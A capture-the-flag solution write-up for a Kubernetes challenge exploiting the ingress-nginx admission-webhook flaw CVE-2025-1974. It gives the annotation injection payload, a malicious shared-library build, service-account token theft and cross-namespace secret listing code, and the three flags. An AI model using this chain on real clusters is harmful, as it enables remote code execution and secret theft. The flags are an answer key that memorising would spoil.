# Sealed — Solution (CVE-2025-1974 IngressNightmare)

## Vulnerability

**CVE-2025-1974** — ingress-nginx ≤ v1.11.4 admission webhook RCE.

The ingress-nginx admission webhook (`ingress-nginx-controller-admission.ingress-nginx.svc:443`)
is reachable unauthenticated from any pod in the cluster. It accepts `AdmissionReview` objects
for any Kubernetes user without credential checks.

When validating an Ingress, the controller generates a nginx config and runs `nginx -t`.
The `auth-tls-match-cn` annotation value is interpolated verbatim into the config (inside an
`if ($ssl_client_s_dn !~ "VALUE")` block). The payload:

```
CN=abc #(
){} }}
ssl_engine ../../../../../../tmp/nginx/client-body/XXXXXXXXXX;
#
```

- `#` comments out the rest of the `if` condition line
- `){} }}` closes the if-body, the enclosing `server{}`, and `http{}`
- `ssl_engine PATH;` lands at the nginx **main** context (valid per nginx docs)
- `ssl_engine` calls `ENGINE_by_id(PATH)` → `dlopen(PATH)` → constructor fires

## Kill chain

### Flag 1 — Cluster recon

```bash
kubectl get configmap -n ingress-nginx cluster-info -o yaml
# flag in data.flag; data.tls-secret reveals calico-system/node-certs
```

Player SA has `configmaps: get,list` cluster-wide via the `sealed-player` ClusterRole.

### Shared library payload

Build `engine.so` for musl (same ABI as the controller container):
```sh
docker run --rm -v $(pwd):/build alpine:3.19 \
  sh -c 'apk add gcc musl-dev; gcc -shared -fPIC -nostartfiles -o /build/engine.so /build/engine.c'
```

`engine.c` constructor (raw syscalls, no libc):
1. Read `/run/secrets/sealed/flag` (flag2 mounted in the pod)
2. Read SA token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
3. Write both to `/tmp/rce_proof`

OpenSSL stubs (`bind_engine` / `v_check` / `ENGINE_load_dynamic`) prevent NULL pointer
dereferences after dlopen. The constructor fires before OpenSSL validates the engine API.

### Library delivery

With `client_body_in_file_only on` in the nginx ConfigMap:

```python
# POST engine.so with correct Content-Length to nginx HTTP (NodePort 30110)
# nginx writes the body to /tmp/nginx/client-body/XXXXXXXXXX and keeps it
# (client_body_in_file_only on = keep file after request; clean = delete)
headers = (f"POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: {len(so_data)}\r\n"
           f"Connection: close\r\n\r\n").encode()
```

List `/tmp/nginx/client-body/` before and after to identify the new file (numbered sequentially).

**Note on the /proc/pid/fd path:** The nginx worker has `NoNewPrivs=1` (from the pod
SecurityContext `allowPrivilegeEscalation: false`), which marks `mm->dumpable = 0`.
`ptrace_may_access()` fails regardless of `ptrace_scope`, so `/proc/<pid>/fd/<n>` cannot
be opened by nginx-t. The disk path is the reliable approach.

### Flag 2 — RCE

```python
# Inject ssl_engine pointing at the temp file via the admission webhook
annotation = "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../tmp/nginx/client-body/XXXXXXXXXX;\n#"

# Send AdmissionReview to admission webhook (from foothold pod or port-forward):
# ingress-nginx-controller-admission.ingress-nginx.svc:443
```

The nginx -t stderr is captured in the AdmissionReview response `status.message`.
`CONSTRUCTOR_RAN` and `FILE_WRITTEN` appear when the constructor fires.

Read `/tmp/rce_proof` from the controller pod to get flag2.

### Flag 3 — Cross-namespace secret theft

The ingress-nginx controller SA has `secrets: list,watch` cluster-wide (standard
ingress-nginx RBAC needed for TLS secret management).

```python
import base64, json, ssl, urllib.request

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

# from inside cluster: https://kubernetes.default.svc:443
url = "https://KUBE_API_SERVER:6443/api/v1/namespaces/vault/secrets"
req = urllib.request.Request(url, headers={"Authorization": f"Bearer {sa_token}"})
with urllib.request.urlopen(req, context=ctx) as r:
    secrets = json.loads(r.read())
    for item in secrets["items"]:
        if item["metadata"]["name"] == "crown-jewels":
            flag3 = base64.b64decode(item["data"]["flag"]).decode()
```

## Reference exploit

`challenge/exploit/exploit.py` — runs the full chain automatically.

```
python3 exploit.py
[flag1] H7CTF{unauthenticated_webhook_attack_surface}
[flag2] H7CTF{rce_as_controller_service_account}
[flag3] H7CTF{cluster_wide_secret_theft_complete}
```
